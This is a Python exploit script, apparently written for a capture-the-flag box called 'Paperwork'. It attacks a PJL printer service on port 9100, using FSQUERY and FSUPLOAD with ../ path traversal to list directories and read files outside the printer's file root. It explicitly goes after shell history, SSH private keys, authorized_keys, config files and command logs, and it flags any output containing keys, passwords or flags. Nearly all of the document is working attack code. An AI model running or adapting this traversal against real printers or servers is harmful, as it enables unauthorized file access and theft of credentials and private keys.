#!/usr/bin/env python3
"""
Paperwork — PJL read sweep (lp → 127.0.0.1:9100).
FSUPLOAD = read. Base escape: ../ from printer/
"""
import re
import socket
import sys

HOST, PORT = "127.0.0.1", 9100
MAX_READ = 12000


def exchange(payload: bytes, timeout: float = 12) -> bytes:
    s = socket.socket()
    s.settimeout(timeout)
    s.connect((HOST, PORT))
    s.sendall(payload)
    out = b""
    try:
        while len(out) < 500000:
            chunk = s.recv(65536)
            if not chunk:
                break
            out += chunk
    except socket.timeout:
        pass
    s.close()
    return out


def alive() -> bool:
    try:
        r = exchange(b"@PJL INFO ID\r\n", 4)
        return bool(r)
    except Exception as e:
        print("ALIVE_ERR", e)
        return False


def fsquery(path: str) -> str:
    r = exchange(f'@PJL FSQUERY NAME="{path}"\r\n'.encode(), 8)
    return r.decode(errors="replace")


def fsread(path: str, size: int) -> bytes:
    if size <= 0:
        size = 256
    size = min(size + 64, MAX_READ)
    r = exchange(f'@PJL FSUPLOAD NAME="{path}"\r\nSIZE={size}\r\n'.encode(), 12)
    return r


def parse_files(listing: str) -> list[tuple[str, int]]:
    out = []
    for line in listing.splitlines():
        line = line.strip()
        m = re.match(r"^(\S+)\s+TYPE=FILE\s+SIZE=(\d+)", line)
        if m:
            out.append((m.group(1), int(m.group(2))))
    return out


def main() -> None:
    print("ALIVE", alive())
    if not alive():
        sys.exit(1)

    queries = [
        "..",
        "../.ssh",
        "../.local",
        "../.cache",
        "../printer",
        "../printer/logs",
        ".",
        "logs",
        "logs/..",
    ]
    to_read: list[tuple[str, int]] = []

    for q in queries:
        print("\n" + "=" * 60)
        print("FSQUERY", q)
        listing = fsquery(q)
        print(listing[:4000])
        base = q.rstrip("/")
        for name, sz in parse_files(listing):
            if base in ("..", "."):
                path = f"../{name}" if base == ".." else name
            elif base == "logs":
                path = f"logs/{name}"
            elif base.endswith("logs"):
                path = f"{base}/{name}"
            else:
                path = f"{base}/{name}"
            to_read.append((path, sz))

    # manual high-value paths
    extras = [
        ("../user.txt", 64),
        ("../.bash_history", 8000),
        ("../.profile", 1024),
        ("../.bashrc", 8192),
        ("../.lesshst", 512),
        ("jetdirect.py", 8192),
        ("logs/commands.log", 15000),
        ("../.ssh/authorized_keys", 512),
        ("../.ssh/id_rsa", 4096),
        ("../.ssh/id_ed25519", 512),
        ("../.ssh/id_ecdsa", 1024),
        ("../.ssh/known_hosts", 2048),
        ("../.ssh/config", 2048),
    ]
    seen = {p for p, _ in to_read}
    for p, sz in extras:
        if p not in seen:
            to_read.append((p, sz))

    # dedupe
    uniq: dict[str, int] = {}
    for p, sz in to_read:
        uniq[p] = max(uniq.get(p, 0), sz)

    print("\n" + "=" * 60)
    print("FILES_TO_READ", len(uniq))
    for path in sorted(uniq.keys()):
        sz = uniq[path]
        if sz > MAX_READ:
            sz = MAX_READ
        print("\n--- READ", path, "req", sz, "---")
        data = fsread(path, sz)
        # strip PJL echo line if present
        text = data.decode(errors="replace")
        if "BEGIN" in text or "ssh-" in text or "HTB{" in text or "PASSWORD" in text or "def " in text:
            print("*** INTERESTING ***")
        print(text[:MAX_READ])


if __name__ == "__main__":
    main()